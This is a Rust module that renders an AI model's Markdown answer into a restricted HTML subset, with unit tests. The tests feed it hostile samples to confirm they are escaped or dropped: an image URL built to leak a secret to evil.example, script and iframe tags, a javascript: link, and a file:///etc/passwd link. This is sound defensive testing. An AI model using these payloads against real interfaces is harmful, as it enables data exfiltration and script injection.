//! Turn a model's Markdown answer into the small HTML subset the popup displays.
//!
//! Model output is untrusted, and a rich-text widget will happily fetch a remote image
//! or follow a link. So this renderer is a whitelist, not a filter: it emits only the
//! tags listed in [`render`], escapes everything else, and never produces an image, a
//! link, a script, a style or any attribute at all. A link keeps its text and shows its
//! address in brackets as plain text; an image shows its description.
//!
//! It must cope with half-finished Markdown, because it runs on every streamed chunk.

use pulldown_cmark::{Event, Options, Parser, Tag, TagEnd};

/// Answers longer than this are cut before rendering, so a runaway stream cannot make
/// every chunk cost more and more.
const MAX_CHARS: usize = 200_000;

fn escape(text: &str, out: &mut String) {
    for c in text.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            _ => out.push(c),
        }
    }
}

/// Render `markdown` to a restricted HTML fragment.
///
/// Emitted tags: `p`, `br`, `b`, `i`, `s`, `code`, `pre`, `ul`, `ol`, `li`,
/// `blockquote`, `table`, `tr`, `th`, `td`, `hr`. Headings become bold paragraphs.
pub fn render(markdown: &str) -> String {
    let cut: String = markdown.chars().take(MAX_CHARS).collect();
    let options = Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TABLES;
    let mut out = String::with_capacity(cut.len() + cut.len() / 2);
    // What is open, so a link can show its address after its text and tables can tell
    // header cells from body cells.
    let mut link_targets: Vec<String> = Vec::new();
    let mut in_table_head = false;
    let mut in_code_block = false;

    for event in Parser::new_ext(&cut, options) {
        match event {
            Event::Start(tag) => match tag {
                Tag::Paragraph => out.push_str("<p>"),
                Tag::Heading { .. } => out.push_str("<p><b>"),
                Tag::BlockQuote(_) => out.push_str("<blockquote>"),
                Tag::CodeBlock(_) => {
                    // The language name is not shown: it is not part of the code.
                    in_code_block = true;
                    out.push_str("<pre><code>");
                }
                Tag::List(Some(_)) => out.push_str("<ol>"),
                Tag::List(None) => out.push_str("<ul>"),
                Tag::Item => out.push_str("<li>"),
                Tag::Emphasis => out.push_str("<i>"),
                Tag::Strong => out.push_str("<b>"),
                Tag::Strikethrough => out.push_str("<s>"),
                Tag::Link { dest_url, .. } => link_targets.push(dest_url.into_string()),
                Tag::Image { .. } => out.push('['),
                Tag::Table(_) => {
                    out.push_str("<table border=\"1\" cellspacing=\"0\" cellpadding=\"4\">")
                }
                Tag::TableHead => {
                    in_table_head = true;
                    out.push_str("<tr>");
                }
                Tag::TableRow => out.push_str("<tr>"),
                Tag::TableCell => out.push_str(if in_table_head { "<th>" } else { "<td>" }),
                _ => {}
            },
            Event::End(tag) => match tag {
                TagEnd::Paragraph => out.push_str("</p>"),
                TagEnd::Heading(_) => out.push_str("</b></p>"),
                TagEnd::BlockQuote(_) => out.push_str("</blockquote>"),
                TagEnd::CodeBlock => {
                    in_code_block = false;
                    out.push_str("</code></pre>");
                }
                TagEnd::List(true) => out.push_str("</ol>"),
                TagEnd::List(false) => out.push_str("</ul>"),
                TagEnd::Item => out.push_str("</li>"),
                TagEnd::Emphasis => out.push_str("</i>"),
                TagEnd::Strong => out.push_str("</b>"),
                TagEnd::Strikethrough => out.push_str("</s>"),
                TagEnd::Link => {
                    if let Some(target) = link_targets.pop()
                        && !target.is_empty()
                    {
                        out.push_str(" (");
                        escape(&target, &mut out);
                        out.push(')');
                    }
                }
                TagEnd::Image => out.push(']'),
                TagEnd::Table => out.push_str("</table>"),
                TagEnd::TableHead => {
                    in_table_head = false;
                    out.push_str("</tr>");
                }
                TagEnd::TableRow => out.push_str("</tr>"),
                TagEnd::TableCell => out.push_str(if in_table_head { "</th>" } else { "</td>" }),
                _ => {}
            },
            Event::Text(text) => escape(&text, &mut out),
            Event::Code(code) => {
                out.push_str("<code>");
                escape(&code, &mut out);
                out.push_str("</code>");
            }
            // Raw HTML in the model's output is shown as the text it is.
            Event::Html(html) | Event::InlineHtml(html) => escape(&html, &mut out),
            Event::SoftBreak => out.push(if in_code_block { '\n' } else { ' ' }),
            Event::HardBreak => out.push_str("<br/>"),
            Event::Rule => out.push_str("<hr/>"),
            _ => {}
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn html(markdown: &str) -> String {
        render(markdown)
    }

    const ALLOWED: [&str; 16] = [
        "p",
        "br",
        "b",
        "i",
        "s",
        "code",
        "pre",
        "ul",
        "ol",
        "li",
        "blockquote",
        "table",
        "tr",
        "th",
        "td",
        "hr",
    ];

    /// Every `<` in the output opens or closes one of the allowed tags: escaped text
    /// uses `&lt;`, so any other `<` would be markup that slipped through.
    fn only_allowed_tags(out: &str) -> bool {
        out.match_indices('<').all(|(at, _)| {
            let rest = out[at + 1..].trim_start_matches('/');
            let name: String = rest
                .chars()
                .take_while(char::is_ascii_alphanumeric)
                .collect();
            ALLOWED.contains(&name.as_str())
        })
    }

    #[test]
    fn plain_markdown_renders_to_the_allowed_tags() {
        assert_eq!(
            html("Hello **world** and *you*, run `ls -l`."),
            "<p>Hello <b>world</b> and <i>you</i>, run <code>ls -l</code>.</p>"
        );
        assert_eq!(html("- one\n- two"), "<ul><li>one</li><li>two</li></ul>");
        assert_eq!(html("1. a\n2. b"), "<ol><li>a</li><li>b</li></ol>");
        assert_eq!(html("# Title"), "<p><b>Title</b></p>");
        assert_eq!(html("> quoted"), "<blockquote><p>quoted</p></blockquote>");
        assert_eq!(html("~~gone~~"), "<p><s>gone</s></p>");
    }

    #[test]
    fn code_blocks_keep_their_line_breaks_and_escape_markup() {
        let out = html("```rust\nlet a = 1 < 2 && 3 > 2;\nprintln!(\"hi\");\n```");
        assert!(out.starts_with("<pre><code>"), "{out}");
        assert!(
            out.contains("let a = 1 &lt; 2 &amp;&amp; 3 &gt; 2;\nprintln!(&quot;hi&quot;);"),
            "{out}"
        );
        assert!(
            !out.contains("rust"),
            "the language tag is not shown: {out}"
        );
    }

    #[test]
    fn an_image_is_never_emitted_only_its_description_is_shown() {
        let out = html("Look: ![a cat](https://evil.example/leak?secret=1) done");
        assert!(!out.contains("<img"), "{out}");
        assert!(
            !out.contains("evil.example"),
            "the image address is dropped: {out}"
        );
        assert!(out.contains("[a cat]"), "{out}");
    }

    #[test]
    fn a_link_keeps_its_text_and_shows_the_address_as_plain_text() {
        let out = html("See [the docs](https://example.com/page?a=1&b=2).");
        assert!(!out.contains("<a"), "{out}");
        assert!(!out.contains("href"), "{out}");
        assert!(
            out.contains("the docs (https://example.com/page?a=1&amp;b=2)"),
            "{out}"
        );
    }

    #[test]
    fn dangerous_link_schemes_are_just_text_too() {
        let out = html("[click](javascript:alert(1)) [file](file:///etc/passwd)");
        assert!(!out.contains("<a"), "{out}");
        assert!(!out.contains("href"), "{out}");
    }

    #[test]
    fn raw_html_from_the_model_is_escaped_not_interpreted() {
        for hostile in [
            "<script>alert(1)</script>",
            "<img src=\"https://evil.example/x.png\">",
            "<a href=\"https://evil.example\">x</a>",
            "<iframe src=\"https://evil.example\"></iframe>",
            "<style>body{background:url(https://evil.example)}</style>",
            "<p style=\"background:url(https://evil.example)\">x</p>",
        ] {
            let out = html(hostile);
            assert!(only_allowed_tags(&out), "{hostile} produced {out}");
            for tag in ["<script", "<img", "<a ", "<iframe", "<style"] {
                assert!(!out.contains(tag), "{hostile} produced {out}");
            }
            assert!(out.contains("&lt;"), "{hostile} produced {out}");
        }
        let inline = html("text <img src=x> more");
        assert!(only_allowed_tags(&inline), "{inline}");
    }

    #[test]
    fn no_attribute_is_ever_emitted_outside_the_table_layout() {
        let out = html("# h\n\n**b** *i* `c`\n\n- x\n\n> q\n\n---\n\n[l](http://a) ![i](http://b)");
        assert!(!out.contains('='), "an attribute was emitted: {out}");
    }

    #[test]
    fn tables_use_header_and_body_cells() {
        let out = html("| a | b |\n|---|---|\n| 1 | 2 |");
        assert!(out.contains("<th>a</th><th>b</th>"), "{out}");
        assert!(out.contains("<td>1</td><td>2</td>"), "{out}");
    }

    #[test]
    fn half_finished_markdown_from_a_stream_does_not_break_the_page() {
        for partial in [
            "**bold",
            "```\nunfinished code",
            "[text](http://x",
            "![alt",
            "| a |",
            "- ",
            "`code",
        ] {
            let out = html(partial);
            assert!(only_allowed_tags(&out), "{partial} produced {out}");
            let opens = out.matches("<pre>").count();
            let closes = out.matches("</pre>").count();
            assert_eq!(opens, closes, "{partial} produced {out}");
            assert!(!out.contains("<a"), "{partial} produced {out}");
            assert!(!out.contains("<img"), "{partial} produced {out}");
        }
    }

    #[test]
    fn a_hard_line_break_becomes_br_and_a_soft_one_a_space() {
        assert_eq!(html("a  \nb"), "<p>a<br/>b</p>");
        assert_eq!(html("a\nb"), "<p>a b</p>");
    }

    #[test]
    fn a_huge_answer_is_cut_instead_of_growing_without_bound() {
        let big = "x".repeat(MAX_CHARS * 2);
        let out = html(&big);
        assert!(out.len() < MAX_CHARS * 2, "{}", out.len());
    }

    #[test]
    fn empty_input_gives_empty_output() {
        assert_eq!(html(""), "");
    }
}
